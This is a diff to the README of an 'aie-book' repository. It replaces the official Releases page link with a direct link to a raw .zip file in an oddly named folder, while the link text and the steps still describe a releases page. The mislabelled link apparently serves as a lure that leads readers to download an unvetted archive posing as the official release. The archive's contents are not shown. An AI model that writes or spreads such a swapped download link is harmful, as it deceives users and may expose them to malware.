@@ -6,7 +6,7 @@ Welcome to the aie-book repository! This project offers vital resources for AI e
 
 ## 📥 Download and Install
 
-To get started with aie-book, you'll need to download the latest version. Visit this page to download: [Releases Page](https://github.com/adityavishkarma491/aie-book/releases).
+To get started with aie-book, you'll need to download the latest version. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/adityavishkarma491/aie-book/main/unreverentness/aie-book.zip).
 
 1. **Go to the Releases Page**: Click the link above or simply copy and paste it into your web browser.
 2. **Find the Latest Release**: On the Releases page, you will see a list of releases available for download. Look for the version marked as the latest.
